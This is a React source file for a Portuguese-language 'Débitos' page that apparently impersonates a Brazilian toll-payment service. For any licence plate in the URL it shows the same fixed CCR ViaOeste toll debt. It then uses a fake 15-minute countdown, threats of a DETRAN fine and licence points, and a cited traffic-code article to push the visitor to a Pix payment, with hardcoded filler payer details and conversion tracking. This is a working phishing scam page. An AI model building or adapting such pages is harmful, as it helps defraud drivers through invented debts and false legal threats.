import { useState } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import heroBg from "@/assets/hero-bg.png";
import { usePageTracking, trackEvent } from "@/hooks/useTracking";

const Debitos = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const placa = searchParams.get("placa") || "ABC1234";
  const [showModal, setShowModal] = useState(true);
  const [selected, setSelected] = useState(false);
  const [showPayment, setShowPayment] = useState(false);
  usePageTracking("/debitos");

  const now = new Date();
  const diasSemana = ["domingo", "segunda-feira", "terça-feira", "quarta-feira", "quinta-feira", "sexta-feira", "sábado"];
  const dia = diasSemana[now.getDay()];
  const hora = now.toLocaleTimeString("pt-BR", { hour: "2-digit", minute: "2-digit" });

  return (
    <div className="min-h-screen bg-gray-100 text-gray-900">
      {/* Header */}
      <header className="flex items-center justify-center relative px-6 py-4 border-b border-gray-200 bg-gray-50">
        <button
          onClick={() => navigate("/")}
          className="absolute left-6 text-gray-900 text-2xl font-bold hover:text-gray-600 transition-colors"
        >
          ‹
        </button>
        <h1 className="text-gray-900 font-bold text-lg">Débitos</h1>
      </header>

      <div className="max-w-3xl mx-auto">
        {/* Banner */}
        <div className="relative h-52 overflow-hidden">
          <img src={heroBg} alt="Banner" className="w-full h-full object-cover" />
          <div className="absolute inset-0 bg-black/30" />
          <div className="absolute bottom-4 left-6 flex items-center gap-2 text-white">
            <span className="text-lg">🚗</span>
            <span className="font-semibold text-sm">Seus veículos:</span>
          </div>
        </div>

        {/* Placa card overlapping banner */}
        <div className="px-6 -mt-4 relative z-10">
          <div className="bg-white border border-gray-200 rounded-lg px-5 py-3 shadow-sm inline-block">
            <span className="text-gray-900 font-semibold text-sm">{placa}</span>
          </div>
        </div>

        {/* Débitos list */}
        <div className="px-6 mt-6">
          {/* Header row */}
          <div className="flex items-center justify-between mb-4">
            <span className="text-gray-900 font-bold text-sm">Débitos</span>
            <span className="text-gray-500 text-xs">Atualizado em: <strong className="text-gray-900">{now.toLocaleDateString("pt-BR")} - {hora}</strong></span>
          </div>

          <div className="border-t border-gray-200" />

          {/* Select all */}
          <label className="flex items-center gap-3 py-4 border-b border-gray-200 cursor-pointer">
            <div className="w-5 h-5 border-2 border-gray-400 rounded flex items-center justify-center bg-white cursor-pointer" onClick={() => setSelected(!selected)}>
              {selected && <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round" className="text-gray-800"><path d="M20 6 9 17l-5-5"/></svg>}
            </div>
            <span className="text-gray-700 text-sm">Selecionar 1 passagens em aberto</span>
          </label>

          {/* Debt item */}
          <label className="flex items-start justify-between py-4 border-b border-gray-200 cursor-pointer">
            <div className="flex items-start gap-3">
              <div className="w-5 h-5 mt-1 border-2 border-gray-400 rounded flex items-center justify-center bg-white cursor-pointer shrink-0" onClick={() => setSelected(!selected)}>
                {selected && <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round" className="text-gray-800"><path d="M20 6 9 17l-5-5"/></svg>}
              </div>
              <div>
                <p className="text-gray-900 font-bold text-sm">{placa}</p>
                <p className="text-gray-500 text-xs mt-1">CCR ViaOeste</p>
                
              </div>
            </div>
            <div className="text-right">
              <p className="text-gray-500 text-sm">Total: <strong className="text-gray-900">67,19</strong></p>
            </div>
          </label>
        </div>

        {/* Spacer for fixed footer */}
        <div className="h-40" />
      </div>

      {/* Fixed bottom */}
      <div className="fixed bottom-0 left-0 right-0 z-40 flex justify-center px-4 pb-6">
        <div className="bg-white border border-gray-200 rounded-xl shadow-2xl w-full max-w-3xl">
          {!showPayment ? (
            <>
              <div className="flex items-center justify-between px-5 py-4 cursor-pointer">
                <span className="text-gray-500 text-sm">Total a pagar:</span>
                <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="text-gray-400"><path d="m6 9 6 6 6-6"/></svg>
              </div>
              <div className="border-t border-gray-100 mx-5" />
              <div className="flex items-center justify-between px-5 py-4">
                <span className="text-gray-900 font-bold text-lg">R$ {selected ? "67,19" : "0,00"}</span>
                <button
                  onClick={() => setShowPayment(true)}
                  className="bg-gray-900 text-lime-400 font-semibold text-sm px-5 py-2.5 rounded-lg hover:bg-black transition-colors"
                >
                  Continuar
                </button>
              </div>
            </>
          ) : (
            <div className="px-5 py-5">
              <h3 className="text-gray-900 font-bold text-lg mb-3">Forma de pagamento</h3>
              <button
                onClick={() => {
                  const valor = selected ? "67,19" : "0,00";
                  trackEvent("order_created", { valor, placa });
                  const params = new URLSearchParams({
                    valor,
                    placa,
                    nome: "Pedagio Digital",
                    email: "pagamento@pedagiodigital.com",
                    telefone: "11999999999",
                    cpf: "26208784620",
                  });
                  navigate(`/pix?${params.toString()}`);
                }}
                className="w-full flex items-center gap-4 py-4 px-4 bg-gray-50 border border-gray-200 rounded-xl hover:bg-gray-100 transition-colors"
              >
                <div className="w-10 h-10 rounded-lg bg-lime-400 flex items-center justify-center">
                  <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="text-gray-900">
                    <path d="M13.17 6.17L17 2l4 4-3.83 3.83" />
                    <path d="M10.83 17.83L7 22l-4-4 3.83-3.83" />
                    <path d="M6.17 6.17L2 10l4.83 4.83" />
                    <path d="M17.83 17.83L22 14l-4.83-4.83" />
                    <path d="m10 10 4 4" />
                  </svg>
                </div>
                <div className="text-left">
                  <p className="text-gray-900 font-semibold text-sm">Pix</p>
                  <p className="text-gray-500 text-xs">Pagamento instantâneo</p>
                </div>
              </button>
            </div>
          )}
        </div>
      </div>

      {/* Modal de Atenção */}
      {showModal && (
        <div className="fixed inset-0 z-50 flex items-end sm:items-center justify-center bg-black/50">
          <div className="bg-white rounded-t-2xl sm:rounded-2xl w-full max-w-lg mx-0 sm:mx-4 mb-0 p-5 sm:p-8 relative max-h-[90vh] overflow-y-auto">
            {/* Handle */}
            <div className="flex justify-center mb-4">
              <div className="w-12 h-1.5 bg-gray-300 rounded-full"></div>
            </div>

            {/* Atenção */}
            <div className="text-center mb-4">
              <span className="text-3xl">⚠️</span>
              <h2 className="text-red-600 font-extrabold text-xl mt-2">ATENÇÃO</h2>
            </div>

            <p className="text-center text-sm text-gray-700 mb-2">
              <strong>Débitos em aberto encontrados</strong> ({placa})
            </p>

            <p className="text-center text-sm text-gray-600 mb-6">
              <span className="text-red-600 font-semibold underline">Hoje, {dia} às {hora}</span> - Caso não realize o
              pagamento, a multa será automaticamente encaminhada ao DETRAN. Após esse prazo de 15 minutos, o sistema
              emitirá automaticamente a multa de{" "}
              <span className="text-red-700 font-bold underline">R$ 195,23</span> e{" "}
              <span className="text-amber-600 font-bold">5 pontos na CNH</span>.
            </p>

            {/* Artigo */}
            <div className="border-l-4 border-red-500 bg-gray-50 rounded-r-lg p-4 mb-6">
              <h3 className="text-gray-900 font-extrabold text-base mb-2">Art. 209-A - CTB:</h3>
              <p className="text-gray-500 text-xs mb-3">
                Conforme o Art. 209-A do CTB: "Efetuar o pagamento de pedágio eletrônico fora do prazo estabelecido pelo órgão..."
              </p>
              <p className="text-sm text-gray-700">
                Infração: <span className="text-red-600 font-bold">Grave.</span>
              </p>
              <p className="text-sm text-gray-700">
                Penalidade: <span className="text-red-600 font-bold">Multa de R$ 195,23.</span>
              </p>
              <p className="text-sm text-gray-700">
                Pontuação: <span className="text-red-600 font-bold">5 pontos na CNH.</span>
              </p>
            </div>

            {/* Botão Continuar */}
            <button
              onClick={() => setShowModal(false)}
              className="w-full py-4 rounded-xl bg-gray-950 text-lime-400 font-bold text-base tracking-wider hover:bg-black transition-colors"
            >
              CONTINUAR
            </button>
          </div>
        </div>
      )}
    </div>
  );
};

export default Debitos;
